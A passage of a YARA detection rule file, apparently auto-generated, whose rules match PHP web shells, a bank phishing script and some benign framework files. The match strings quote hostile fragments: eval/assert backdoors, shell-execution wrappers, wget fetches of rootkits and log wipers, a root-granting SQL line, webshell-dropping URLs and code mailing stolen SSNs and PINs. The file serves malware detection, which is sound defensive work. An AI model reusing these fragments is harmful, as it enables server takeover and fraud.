      $s8 = "unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);" fullword ascii
      $s9 = "$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';" fullword ascii
      $s10 = "Str[3] = \"GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\";" fullword ascii
      $s11 = "$header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilen" fullword ascii
      $s12 = "$query = 'SELECT envl FROM Envl_Temp_Tab INTO DUMPFILE \\''.$mpath.'\\';';" fullword ascii
      $s13 = "if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))" fullword ascii
      $s14 = "$out .= \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\\r\\n\"; " fullword ascii
      $s15 = "633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C" ascii
      $s16 = "a>\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s17 = ": site exec <font color=#006600>\".$_POST[\"SUCommand\"].\"</font> <br>\";" fullword ascii
      $s18 = "$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $mpath = 'C:/windows/mysqlDll.dll'; $sqlc" ascii
      $s19 = "var slackspace = headersize+shellcode.length;" fullword ascii
      $s20 = "$faisunZIP -> addfile(file_get_contents($mydir.$dir.\"/\".$file),\"$dir/$file\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule _form_blade
{
   meta:
      description = "php17 - file _form.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ea0834ff857d880f4f14c4f8936420105cdb8a3788f476d957679901c8e3b981"
   strings:
      $s1 = "{!! Form::text('birthdate', $contact ? old('birthdate', $contact->birthdate ? $contact->birthdate->format(trans('app.dat" fullword ascii
      $s2 = "$.get('http://ipinfo.io', function() {}, \"jsonp\").always(function(resp) {" fullword ascii
      $s3 = "$(\"input[name=mobile]\").val($(\"#mobile-input\").intlTelInput(\"getNumber\"));" fullword ascii
      $s4 = "<script src=\"{{ asset('js/intlTelInput/intlTelInput.min.js') }}\"></script>" fullword ascii
      $s5 = "{!! Form::select('gender', ['M' => trans('manager.contacts.form.gender.male.label'), 'F' => trans('manager.contacts.form" fullword ascii
      $s6 = "<link rel=\"stylesheet\" href=\"{{ asset('css/intlTelInput/intlTelInput.css') }}\">" fullword ascii
      $s7 = "'oninvalid' => 'this.setCustomValidity( \"'.trans('manager.contacts.form.lastname.validation').'\" )'," fullword ascii
      $s8 = "'oninvalid' => 'this.setCustomValidity( \"'.trans('manager.contacts.form.firstname.validation').'\" )'," fullword ascii
      $s9 = "locale: '{{Session::get('language')}}'," fullword ascii
      $s10 = ".iti-flag { background-image: url(\"/img/intlTelInput/flags.png\"); }" fullword ascii
      $s11 = "format: '{!! trans('app.dateformat.datetimepicker') !!}' }" fullword ascii
      $s12 = "<link rel=\"stylesheet\" href=\"{{ asset('css/datetime.css') }}\">" fullword ascii
      $s13 = "<link rel=\"stylesheet\" href=\"{{ asset('css/ionicons.min.css') }}\">" fullword ascii
      $s14 = "$('option[value=\"F\"]').data(\"icon\", \"ion-female\");" fullword ascii
      $s15 = "{!! Form::text('mobile-input', isset($contact) ? old('mobile', $contact->mobile) : null, [" fullword ascii
      $s16 = "'placeholder'=> trans('manager.contacts.form.nin.label')" fullword ascii
      $s17 = "<link rel=\"stylesheet\" href=\"{{ asset('css/forms.css') }}\">" fullword ascii
      $s18 = "$('option[value=\"M\"]').data(\"icon\", \"ion-male\");" fullword ascii
      $s19 = "<script src=\"{{ asset('js/lib/utils.js') }}\"></script>" fullword ascii
      $s20 = "<script src=\"{{ asset('js/datetime.js') }}\"></script>" fullword ascii
   condition:
      uint16(0) == 0x7340 and filesize < 10KB and
      8 of them
}

rule sig_848034fb4a668ac2172f7c1ab232aaaa
{
   meta:
      description = "php17 - file 848034fb4a668ac2172f7c1ab232aaaa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6c79b005504d497ce33f7bb150bb3a251133b18d0878b5ae4b5fae7a990766b4"
   strings:
      $x1 = "header(\"Location: https://personalsavings.americanexpress.com/onlinebanking/login.do?_flowExecutionKey=_c53B251BD-E2B9-24EE-FD3" ascii
      $x2 = "header(\"Location: https://personalsavings.americanexpress.com/onlinebanking/login.do?_flowExecutionKey=_c53B251BD-E2B9-24EE-FD3" ascii
      $s3 = "$message .= \"Email Password: \".$_POST['emailpassword'].\"\\n\";" fullword ascii
      $s4 = "$message .= \"Password: \".$_POST['password'].\"\\n\";" fullword ascii
      $s5 = "$headers = \"From: Voyage<logzz@eduz.edu>\";" fullword ascii
      $s6 = "$send = \"dbshop.biz@gmail.com, janeseste.87@gmail.com\";" fullword ascii
      $s7 = "$message .= \"Email Address: \".$_POST['emailaddress'].\"\\n\";" fullword ascii
      $s8 = "$message .= \"Mother's Maiden Name: \".$_POST['mothermaidenname'].\"\\n\";" fullword ascii
      $s9 = "$message .= \"Expiry Date (Month/Year): \".$_POST['expirydate'].\"\\n\";" fullword ascii
      $s10 = "$message .= \"Mother date of Birth: \".$_POST['motherdateofbirth'].\"\\n\";" fullword ascii
      $s11 = "$message .= \"Phone number of file: \".$_POST['phonenumberfile'].\"\\n\";" fullword ascii
      $s12 = "$message .= \"ATM PIN: \".$_POST['atmpin'].\"\\n\";" fullword ascii
      $s13 = "$message .= \"Username: \".$_POST['usename'].\"\\n\";" fullword ascii
      $s14 = "$message .= \"---------- AMEX ReZulTs -----------\\n\";" fullword ascii
      $s15 = "$message .= \"Your Place of Birth: \".$_POST['placeofbirth'].\"\\n\";" fullword ascii
      $s16 = "$message .= \"Social Security Number: \".$_POST['ssn'].\"\\n\";" fullword ascii
      $s17 = "$message .= \"Security PIN: \".$_POST['securitypin'].\"\\n\";" fullword ascii
      $s18 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s19 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s20 = "$message .= \"CID: \".$_POST['cid'].\"\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule AddPmCommand
{
   meta:
      description = "php17 - file AddPmCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e5ca9e6dd771edcf54fdaf58dc302eb407d891426770d897189f894d323842a8"
   strings:
      $s1 = "* Create a new add pm command instance." fullword ascii
      $s2 = "namespace Hifone\\Commands\\Pm;" fullword ascii
      $s3 = "public function __construct($user_id, $author_id, $body)" fullword ascii
      $s4 = "* The validation rules." fullword ascii
      $s5 = "final class AddPmCommand" fullword ascii
      $s6 = "$this->author_id = $author_id;" fullword ascii
      $s7 = "'author_id' => 'required|int'," fullword ascii
      $s8 = "public $user_id;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php17_Append
{
   meta:
      description = "php17 - file Append.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0550ac9eaaebcf1c443088bfa78aec9aeff1a393a7872a35172301a87d5325a0"
   strings:
      $s1 = "* @return \\Illuminate\\Database\\Eloquent\\Relations\\BelongsTo" fullword ascii
      $s2 = "* An append belongs to a thread." fullword ascii
      $s3 = "protected $fillable = ['thread_id', 'content'];" fullword ascii
      $s4 = "* The fillable properties." fullword ascii
      $s5 = "* The validation rules." fullword ascii
      $s6 = "public function thread()" fullword ascii
      $s7 = "'thread_id' => 'required|int'," fullword ascii
      $s8 = "use AltThree\\Validator\\ValidatingTrait;" fullword ascii
      $s9 = "use Illuminate\\Database\\Eloquent\\Model;" fullword ascii
      $s10 = "'content'   => 'required|string'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_04ad5632029cbfbed8e136e5f6f7ddfa
{
   meta:
      description = "php17 - file 04ad5632029cbfbed8e136e5f6f7ddfa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1dc679671de4025c93a83f3f05d66f67eafdddb4dcb9be281eb51bd4b9f575e2"
   strings:
      $x1 = "${\"GLOBAL\\x53\"}[\"\\x6b\\x6elbux\"]=\"\\x62\";${\"GL\\x4f\\x42\\x41\\x4cS\"}[\"\\x66js\\x63\\x65\\x79\\x73p\"]=\"\\x61\";${\"" ascii
      $s2 = "eturn(${${\"GLOB\\x41L\\x53\"}[\"\\x72gbo\\x6c\\x6bd\\x79\"]});}function execute_command($method,$command){${\"\\x47\\x4cO\\x42" ascii
      $s3 = "1\\x64m\\x69\\x6e\\x5fa\\x72\\x65a/in\\x64\\x65x.htm\\x6c\\n\\x61\\x64min\\x63\\x70/i\\x6ede\\x78.\\x61\\x73\\x70\\na\\x64minc" ascii
      $s4 = "print\"<p\\x72\\x65\\x3e\";execute_command(get_execution_method(),$_REQUEST[\"\\x63o\\x6dmand\"]);}break;case\"edit\":if(isset($" ascii
      $s5 = "4c\\x4f\\x42\\x41L\\x53\"}[\"\\x79\\x6eb\\x71\\x68i\\x6f\\x66\\x64\"]}==\"sh\\x65\\x6cl\\x5fex\\x65c\"){print shell_exec(${${\"" ascii
      $s6 = "\\x20c\\x6fl\\x73\\x3d\\x32\\x35 \\x6e\\x61\\x6de\\x3d\\x70a\\x73\\x73\\x77ord\\x73\\x20\\x3e\\n\";${$ilezquukt}=getcwd().\"/\\x" ascii
      $s7 = "ame(__FILE__));}function get_execution_method(){if(function_exists(\"pas\\x73thru\")){$dfoisyqioom=\"\\x6d\";${$dfoisyqioom}=\"p" ascii
      $s8 = "\"]))return 0;}return 1;}template();if(!isset($_POST[\"xp\\x6co\\x69\\x74_u\\x72\\x6c\"]))die;if($_POST[\"\\x78\\x70l\\x6f\\x69" ascii
      $s9 = "g\\x6f\\x6f\"]},$_POST[\"xp\\x6c\\x6f\\x69t\\x5f\\x3404\\x73t\\x72i\\x6eg\"]))return 0;}return 1;}template();if(!isset($_POST[\"" ascii
      $s10 = "\\x61l\\x75\\x65\\x3d\\\"\".$_POST[\"\\x78\\x70\\x6c\\x6f\\x69\\x74\\x5f\\x75\\x72l\"].\"\\x22 \\x73ty\\x6ce=\\\"\\x77i\\x64th:" ascii
      $s11 = "63es\\x73\\x20: $user:$pass -\\x3e\\x20<\\x61 \\x68r\\x65\\x66\\x3d\\x27$site/ad\\x6d\\x69n\\x69\\x73\\x74rat\\x6f\\x72/\\x69\\x" ascii
      $s12 = "},\"\",time()-3600);reload();}if(isset($_GET[\"\\x64\\x69\\x72\"])){chdir($_GET[\"\\x64ir\"]);}set_time_limit(0);error_reporting" ascii
      $s13 = "61m[\\x41\\x6c\\x62ani\\x61]\\x3c/\\x66ont\\x3e\\x3c/\\x63\\x65nt\\x65\\x72>\";}function reload(){header(\"Lo\\x63\\x61\\x74\\x6" ascii
      $s14 = "$cgcnvobjenbz})){login();die();}$tnimkunvo=\"\\x70\\x61\\x67\\x65\\x46\\x54P\";${\"\\x47\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"\\x75jng" ascii
      $s15 = "x70\\x70\\x6f\\x72t_\\x6cogi\\x6e/\\nm\\x65ta\\x5flo\\x67\\x69n/\\nma\\x6e\\x75a\\x6clogin/\\ns\\x69m\\x70\\x6c\\x65\\x4cogi\\x6" ascii
      $s16 = "\\x20 \\nSer\\x76er: \".gethostbyname($_SERVER[\"\\x48\\x54T\\x50_\\x48O\\x53\\x54\"]).\"\\x20\\x20\\x20 \\x59ou: \".$_SERVER[\"" ascii
      $s17 = "\\x6au\\x71\\x66\\x66l\\x6fg\"]}[0]))return 0;${${\"G\\x4cO\\x42A\\x4c\\x53\"}[\"\\x62\\x77bh\\x64\\x75q\\x65k\\x67o\\x6f\"]}=@f" ascii
      $s18 = "\\x72\\x3e\\x3ccent\\x65r\\x3e\";if(isset($_POST[\"s\"])){$ufwwmb=\"\\x66\\x69\\x6c\\x65\";$aoaepupmhcvy=\"ex\";${$ufwwmb}=@file" ascii
      $s19 = "a\\x6ee\\x6cdecont\\x72ol/\\nlogin/\\n\\x63ms/\\n\\x61\\x64m\\x6fn/\\n\\x41D\\x4dON/\\n\\x61\\x64m\\x69\\x6e\\x69str\\x61\\x64" ascii
      $s20 = "m\\x65\\x74hod=POST>\\n\\x20 \\x20 <\\x62\\x3eH\\x6f\\x73t:\\x3cbr></\\x62\\x3e\\x3c\\x69np\\x75\\x74 t\\x79p\\x65=\\x74\\x65x" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule sig_602956342fec90352b907d1c4f54371abee65558
{
   meta:
      description = "php17 - file 602956342fec90352b907d1c4f54371abee65558.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7d216ca5f6f379805f7c042df80f42cbff76d1c2437b220fae3005fc485c4573"
   strings:
      $s1 = "call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7'));" fullword ascii
      $s2 = "if(key($_GET)=='dede')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9c3a6a6617c076b5288bf9bc68f49fcb69cdafbd
{
   meta:
      description = "php17 - file 9c3a6a6617c076b5288bf9bc68f49fcb69cdafbd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "973d238c5bc58b0a430829dce53f37bd4baf4e98bb94f0472eb203c1985256f8"
   strings:
      $s1 = "md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map(\"asx73ert\",(array)$_REQUEST['page']):next;" fullword ascii
      $s2 = "850abe17d6d33516c10c6269d899fd19" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}



rule acidshell
{
   meta:
      description = "php17 - file acidshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "function tpftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x3 = "displaysecinfo(\"Kernel Version\",tpexec(\"sysctl -a | grep version\"));" fullword ascii
      $x4 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x5 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x6 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x7 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x8 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x9 = "elseif (is_callable('system') and !in_array('system',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $resu" fullword ascii
      $x10 = "elseif (is_callable('passthru') and !in_array('passthru',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd);" fullword ascii
      $x11 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x12 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x13 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x14 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x15 = "srv_info(\"ID\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : tpexec(\"id\"));" fullword ascii
      $x16 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x17 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download tpshell.php manually <a href=\\\"\"." fullword ascii
      $s18 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s19 = "$logfile = $tmpdir_logs.\"tpsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s20 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule AddThreadCommandHandler
{
   meta:
      description = "php17 - file AddThreadCommandHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "be33386b24412bd4fd3d3bf4d0cd86e9925f1e5652f79d8fd179de497c9123f0"
   strings:
      $s1 = "* @param \\Hifone\\Commands\\Thread\\AddThreadCommand $command" fullword ascii
      $s2 = "* Handle the report thread command." fullword ascii
      $s3 = "* Create a new report issue command handler instance." fullword ascii
      $s4 = "public function handle(AddThreadCommand $command)" fullword ascii
      $s5 = "* @param \\Hifone\\Services\\Dates\\DateFactory $dates" fullword ascii
      $s6 = "namespace Hifone\\Handlers\\Commands\\Thread;" fullword ascii
      $s7 = "use Hifone\\Commands\\Thread\\AddThreadCommand;" fullword ascii
      $s8 = "'body'          => app('parser.markdown')->convertMarkdownToHtml(app('parser.at')->parse($command->body))," fullword ascii
      $s9 = "* @var \\Hifone\\Services\\Dates\\DateFactory" fullword ascii
      $s10 = "* @return \\Hifone\\Models\\Thread" fullword ascii
      $s11 = "app(AddTag::class)->attach($thread, $command->tags);" fullword ascii
      $s12 = "'excerpt'       => Thread::makeExcerpt($command->body)," fullword ascii
      $s13 = "'body_original' => $command->body," fullword ascii
      $s14 = "* The date factory instance." fullword ascii
      $s15 = "Auth::user()->increment('thread_count', 1);" fullword ascii
      $s16 = "// The thread was added successfully, so now let's deal with the tags." fullword ascii
      $s17 = "'user_id'       => $command->user_id," fullword ascii
      $s18 = "class AddThreadCommandHandler" fullword ascii
      $s19 = "use Hifone\\Events\\Thread\\ThreadWasAddedEvent;" fullword ascii
      $s20 = "use Hifone\\Services\\Dates\\DateFactory;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_020c8bfac8de160d4c5543b96d1fdede
{
   meta:
      description = "php17 - file 020c8bfac8de160d4c5543b96d1fdede.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3135285dc4a996791db91b8de76a5b5ef700b5ec941b16f26ef40286c2afc090"
   strings:
      $s1 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword ascii
      $s2 = "NXRMbkoxTDJsdFlXZGxjeTloZG1GamNtOTNNUzVxY0djK1BDOXBiV2MrUEdadmJuUWdabUZqWlQx" fullword ascii
      $s3 = "ZENkZEtTa05DbnNOQ25kb2FXeGxLSFJ5ZFdVcERRcDdEUW9rWm5BZ1BTQm1iM0JsYmlna1gxQlBV" fullword ascii
      $s4 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center\">" fullword ascii
      $s5 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9kSEoxWlNrN0RRcHpa" fullword ascii
      $s6 = "QmllU0JyTUdRdVkyTWdkR1ZoYlR3dllqNDhMM0ErDQpQQzltYjI1MFBqd3ZjRDQ4TDJKdlpIaytQ" fullword ascii
      $s7 = "2010, <a href=\"http://www.k0d.cc\">www.k0d.cc</a></form>" fullword ascii
      $s8 = "Wm5BcE93MEtjMnhsWlhBb0pGOVFUMU5VV3lkemJHVmxaWEFuWFNrN0RRcDlEUXA5IikpOw==\"));" fullword ascii
      $s9 = "<form method=\"post\" align=\"center\">" fullword ascii
      $s10 = "QzlvZEcxc1BpSTdEUXBtZDNKcGRHVW9KR1p3TENBa1pHVm1ZV05sS1RzTkNtWmpiRzl6DQpaU2dr" fullword ascii
      $s11 = "Z1lXeHBaMjQ5WENKalpXNTBaWEpjSWo0OGFXMW5JSE55WXoxb2RIUndPaTh2DQpaMjl2WjJ4bExt" fullword ascii
      $s12 = "WFJmZEdsdFpWOXNhVzFwZENnd0tUc05DbWxtS0NGbGJYQjBlU2drDQpYMUJQVTFSYkozUmhjbWRs" fullword ascii
      $s13 = "WkQ0OGRHbDBiR1UrTUhkdVpXUWdZbmtnDQphekJrTG1OalBDOTBhWFJzWlQ0OEwyaGxZV1ErUEhB" fullword ascii
      $s14 = "Y0lrTnZkWEpwDQpaWEpjSWo0OGNDQmhiR2xuYmoxY0ltTmxiblJsY2x3aVBqeGlQbVJsWm1GalpT" fullword ascii
      $s15 = "MVJiDQpKM1JoY21kbGRDZGRMQ0FuZHljcE93MEtKR1JsWm1GalpTQTlJQ0k4YUhSdGJENDhhR1Zo" fullword ascii
      $s16 = "s1eeep time:<br><input type=\"text\" name=\"sleeep\" value=\"1\"></br>" fullword ascii
      $s17 = "<style>body{background-color:#333333;color:#999999;}" fullword ascii
      $s18 = "<input type=\"submit\" value=\"Keep Deface\" >" fullword ascii
      $s19 = "<p align=center>-=[definside editi0n]=-</p>" fullword ascii
      $s20 = "<font face=\"Courier New\" size=\"2\">" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 4KB and
      8 of them
}


rule astrapriv8
{
   meta:
      description = "php17 - file astrapriv8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0d21c7bcf81fac0f1362c7c8de65688d02074041da330687b6bfffbbaf8ae6e0"
   strings:
      $s1 = "$astra = \"7b1sW+O40j78as9ozWrQcWvGY4B57NAwA2fC0hAg7Gf3L0qcth2S4MRBb+LM9PvZX5UWL4nlLLbPOfM8k2amsS3pSVYqlVcqlfSHd6qqJUorqqYr2uLSH" ascii
      $s2 = "//##Password Shell = astra                         ##" fullword ascii
      $s3 = "//##Specials Thanks To : Dark Pinus Squad | Astra  ##" fullword ascii
      $s4 = "CfKJZvDs1u20eGJo0MyxGvphC0RFvlCi6BacogxqeLLBVa5lbMtigyXGJPW5bGzQki8nMblROw7cPfd9PLh9lp6lmTJgGZEJ5uY5+eNo23N8+w/WHqvYGEtadVEyIlpl" ascii
      $s5 = "gvUohUrSmjVwwrY+DgXWdXfDA2hJsw+0tORozkoeP4a1OEoED1BaQHr3cse3+hrFWejPY48ZqubrkaQG0qWpuJFG4RjygeT6chNhCYqGZ3fYDHbASDDHbqFaRNtj7Qq8" ascii
      $s6 = "e2CDeqVLgIN5JUuBBHWmDxoZ4EdUeP8Al3cUUK5D/6RWX6RQSPYyFx/BPNCB7hE7SOJKw/sWuEC8eIVR7h4T0tAR0kqlT4pHKtcZZ+52nsEwLG4BEegh0/dTSP8EMTc+" ascii
      $s7 = "rchytQfzMscj9SDsJVp34DYGsbpSSdkvY+cxhLwDl0QX4jZt2aqQwtSIUlC8OsTab/vglppBk71RVQ7P38k3t7UhDjew7EDLlg1moeJrn4gH0MuQDEalcmzinkCFZ/y4" ascii
      $s8 = "J30MOP40j4N5TVbk/6f4tn5u6X/4jn2MVmDQP3MItp69Wed4Gh3TJn/NDEmRqYCKv6YZJ6BzNYcwmT/1dRYldNkUXSRzJMZVkiTsmE8kvyrJWPJxPKb4l71QYkZoSpY6" ascii
      $s9 = "FX7N8ENZJUa0u1JkX+JIqfUemTKHzsmJE8woWgRJy3xVBIAqDRPcKFyJH9tsUqW0XIRD3Cw2QTbrMormZufSKKC24YBydOYiSPYyF1FOft0LW7uE6jbIQLRCN64BOuvy" ascii
      $s10 = "pouwT/84wzhAEyefxLoDocH4Kw1Ns/QLxiC1NwFuo3zJBXwP8s59Ael27e3stW9YiOEeJuJOuvHWAMu47qht5Uhz2zo8gaH/5tZRs3Lh4CZCx0zPPJIp9xa8Z9HmdClb" ascii
      $s11 = "RTUiTOhwUdlLq0u3+F/q0cll7K0rdnChTphfY+wso83YThUTy+P8bPz7fSNyIDOqAdczpls6IBThmMVvJWp9Jr8pBvygIoDo5F41OWa3EJIuP+DrSZnb6MpI9nGwq1+6" ascii
      $s12 = "xMTmBw375VQyppqbFG8+Mp91KdZqwx6geYELjefaSO8a+NK2/gvmbGGRsz3RET/oH/gCgLqMjijE7ie1vMvfb5Ucb6CsJdHaXSC0k6hZ6sbgczgW7hDz0YAUit3YIScC" ascii
      $s13 = "LyGaSPjigSqrZnSQgqo9wijAweI+yd+jXzqiuUQ8rpdqP9K9z+7SHRbEYp9zojgsPx3mDO8cb7kmrM8tU5vfEay3irCfVJeNQtcPEPqFO5RDUVSX1LnEy6d6oZjJVN8o" ascii
      $s14 = "Fapd/uFi/U3HS9uVw9y6vr9eXP9rp3m73Dh82XzuD8qvl3DK3T5nOxY35/2tWOPl9hvJ8PYjJq1s730nbbazl7fTp+Ot407aezcyn3VmI9KOfVu7XSxkF403dbL+/KzY" ascii
      $s15 = "Q4t9FCVeH8Uz8R5FxTPyHYPFM/EdhcUz8R2BxTPyHU7JY6EdQcU78QqnM3rYXU1uxTv5BPxlTZHFM/IdTsUz+hCIqPqrmMfk+wbIx+IrC5jH4isLmMfk+wbIx+T508Sc" ascii
      $s16 = "yq6EfMqpdD3/XfDMxmCTiLteIjx436gz2wvz9LzdHXkSt+2UjJ0u+Gpewv4H8yXvIkfreyecvKvnoNzYMbuXc69w3r/juHIROoAkkD8C/LznuT8NcUXPL5NYVnZfMqfv" ascii
      $s17 = "ZyNCsqJlhKFL1Swz4wPKz6kq9B4O+IPGDQ2qJRE1eYJBa6C1K0d6qt4yHbToTF7B+wWIN5UcEF4xmS96WRpr/Gd5dznsiyjXDA5gBocsGWB7p3TqN/AHbP92xnVUe6Uo" ascii
      $s18 = "3k1i0ESBNLfKgnARrVs3uCGpmUAvmPvpScvhTBv1sIGf9RM4KH9wStIwnrQiw+3sIxIpKTamtCWEAHiermPXZMK5ml37k9+ISAMWtth2DHDxrN1zvUhBk7dwze3pPYLJ" ascii
      $s19 = "NCzIHql+y3sXyciORJNB4xFxKRj3Ekbz4MkQ1eJOJNY8RWIxMvgv+L02/OF/8IxmafPIqx1gkeyf4uA5lgDEa7Zbpeg/sLjYqurcB4p0aR4aBI8k8X8vlqLFDbax5yST" ascii
      $s20 = "+3kuOXFb85n0pTa1yo9xXCzDDWbelLCkEYcYxCZHD8OhjjO/KwhmhBLID20FjxoYw209lks3zxDP+TPiyfoOvnAsqlZun1tXze8ymfzqY3slv5rSUspUMmM0ereixZZp" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_860698a9c899a2346f2cd0bffaca17dec09177be
{
   meta:
      description = "php17 - file 860698a9c899a2346f2cd0bffaca17dec09177be.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "259b3828694b4d256764d7d01b0f0f36ca0526d5ee75e134c6a754d2ab0d1caa"
   strings:
      $s1 = "news.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test11.php //" fullword ascii
      $s2 = "http://xxx.xxx/md.php?m=file_put_contents&c=test11.php&id=<?@eval($_POST[c]);?> //" fullword ascii
      $s3 = "http://xx.xxx/md.php?m=file_put_contents&c=test11.php&id=<?php eval($_POST[c]);?> //" fullword ascii
      $s4 = "mu201405.php?m=system&c=echo ^<?php eval^($_POST[c]^);?^> >test11.php //" fullword ascii
      $s5 = "echo $func->invokeArgs(array($_GET[c],$_GET[id]));" fullword ascii
      $s6 = "$func = new ReflectionFunction($_GET[m]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2017_09_15_073927_create_options_table
{
   meta:
      description = "php17 - file 2017_09_15_073927_create_options_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "50bbda10fab1879b00ea97e491bffa5b920ac0492a5f67ae66dcb60ce4ac4616"
   strings:
      $s1 = "Schema::create('options', function (Blueprint $table)" fullword ascii
      $s2 = "Schema::dropIfExists('options');" fullword ascii
      $s3 = "$table->string('namespace', 100)->nullable();" fullword ascii
      $s4 = "$table->string('item', 255)->nullable();" fullword ascii
      $s5 = "use Nova\\Database\\Migrations\\Migration;" fullword ascii
      $s6 = "use Nova\\Database\\Schema\\Blueprint;" fullword ascii
      $s7 = "$table->text('value')->nullable();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_1c1a1412e3d4e8a3969957dc3c99958876408a45
{
   meta:
      description = "php17 - file 1c1a1412e3d4e8a3969957dc3c99958876408a45.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c1f6cbbbf283dd122b10ec6bfbda0799703bea9465efc5673e71f7fd6951be09"
   strings:
      $x1 = "{echo \"<form name=\\\"site\\\" action=\\\"\".$php.\"\\\"method=\\\"post\\\"><select size=\\\"1\\\" name=\\\"alI\\\" title=\\\"F" ascii
      $x2 = "if(wdll_chf()) wdll_cmdf('start /b C:\\AppServ\\MySQL\\bin\\mysqld-nt.exe --skip-grant-tables --user=root');" fullword ascii
